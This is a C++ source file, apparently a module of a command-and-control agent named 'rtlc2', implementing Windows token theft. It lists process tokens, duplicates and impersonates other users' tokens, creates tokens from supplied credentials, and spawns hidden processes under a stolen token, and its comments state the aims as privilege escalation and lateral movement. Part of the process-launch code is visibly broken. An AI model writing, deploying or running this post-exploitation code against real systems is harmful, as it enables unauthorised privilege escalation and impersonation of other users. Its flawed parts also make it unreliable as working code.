// Token Manipulation - Steal, impersonate, and create Windows tokens
// Used for privilege escalation and lateral movement
#include "agent.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <cstring>
#include <string>
#include <sstream>

namespace rtlc2 {
namespace modules {

// Current impersonation token (if any)
static HANDLE g_impersonationToken = NULL;

// List all accessible tokens on the system
std::string TokenList() {
    std::ostringstream out;
    out << "PID\tUser\t\t\tIntegrity\n";
    out << "---\t----\t\t\t---------\n";

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return "Failed to enumerate processes";

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hToken = NULL;
            if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                // Get user SID
                BYTE tokenUser[256];
                DWORD retLen = 0;
                if (GetTokenInformation(hToken, TokenUser, tokenUser, sizeof(tokenUser), &retLen)) {
                    TOKEN_USER* pUser = (TOKEN_USER*)tokenUser;
                    LPSTR sidStr = NULL;
                    char name[256] = {}, domain[256] = {};
                    DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
                    SID_NAME_USE sidType;

                    if (LookupAccountSidA(NULL, pUser->User.Sid, name, &nameLen,
                                          domain, &domainLen, &sidType)) {
                        out << pe.th32ProcessID << "\t" << domain << "\\" << name;

                        // Pad to align
                        int totalLen = (int)strlen(domain) + 1 + (int)strlen(name);
                        for (int i = totalLen; i < 24; i++) out << " ";
                    } else if (ConvertSidToStringSidA(pUser->User.Sid, &sidStr)) {
                        out << pe.th32ProcessID << "\t" << sidStr;
                        LocalFree(sidStr);
                    }
                }

                // Get integrity level
                BYTE ilBuf[256];
                if (GetTokenInformation(hToken, TokenIntegrityLevel, ilBuf, sizeof(ilBuf), &retLen)) {
                    TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL*)ilBuf;
                    DWORD* ridPtr = GetSidSubAuthority(pLabel->Label.Sid,
                        *GetSidSubAuthorityCount(pLabel->Label.Sid) - 1);
                    DWORD rid = *ridPtr;

                    if (rid >= 0x4000) out << "System";
                    else if (rid >= 0x3000) out << "High";
                    else if (rid >= 0x2000) out << "Medium";
                    else out << "Low";
                }

                out << "\n";
                CloseHandle(hToken);
            }
            CloseHandle(hProc);
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return out.str();
}

// Steal token from process
std::string TokenSteal(uint32_t pid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return "Failed to open process " + std::to_string(pid);

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
        CloseHandle(hProc);
        return "Failed to open process token";
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken);
        return "Failed to duplicate token";
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        return "Failed to impersonate token";
    }

    // Store for later revert
    if (g_impersonationToken) CloseHandle(g_impersonationToken);
    g_impersonationToken = hDup;

    // Get the user name
    char name[256] = {}, domain[256] = {};
    DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
    BYTE tokenUser[256];
    DWORD retLen = 0;
    if (GetTokenInformation(hDup, TokenUser, tokenUser, sizeof(tokenUser), &retLen)) {
        TOKEN_USER* pUser = (TOKEN_USER*)tokenUser;
        SID_NAME_USE sidType;
        LookupAccountSidA(NULL, pUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType);
    }

    return std::string("Impersonating ") + domain + "\\" + name + " (from PID " + std::to_string(pid) + ")";
}

// Create token with credentials
std::string TokenMake(const std::string& user, const std::string& password, const std::string& domain) {
    HANDLE hToken = NULL;

    if (!LogonUserA(user.c_str(), domain.empty() ? "." : domain.c_str(),
                    password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_WINNT50, &hToken)) {
        return "LogonUser failed: " + std::to_string(GetLastError());
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        CloseHandle(hToken);
        return "Failed to impersonate";
    }

    if (g_impersonationToken) CloseHandle(g_impersonationToken);
    g_impersonationToken = hToken;

    return std::string("Created and impersonating token for ") +
           (domain.empty() ? "." : domain) + "\\" + user;
}

// Revert to original token
std::string TokenRevert() {
    if (!RevertToSelf()) {
        return "RevertToSelf failed";
    }

    if (g_impersonationToken) {
        CloseHandle(g_impersonationToken);
        g_impersonationToken = NULL;
    }

    return "Reverted to original token";
}

// Run command as another user
std::string TokenRunAs(uint32_t pid, const std::string& command) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return "Failed to open process";

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        return "Failed to open token";
    }
    CloseHandle(hProc);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hDup)) {
        CloseHandle(hToken);
        return "Failed to duplicate token";
    }
    CloseHandle(hToken);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    char cmd[MAX_PATH];
    strncpy(cmd, command.c_str(), MAX_PATH - 1);
    cmd[MAX_PATH - 1] = '\0';

    if (!CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE, NULL, (LPWSTR)NULL,
                                  CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
        // Fallback: CreateProcessAsUser
        if (!CreateProcessAsUserA(hDup, NULL, cmd, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hDup);
            return "Failed to create process with token: " + std::to_string(GetLastError());
        }
    }

    CloseHandle(hDup);
    CloseHandle(pi.hThread);

    // Wait and capture output (simplified)
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);

    return "Process started with stolen token from PID " + std::to_string(pid);
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
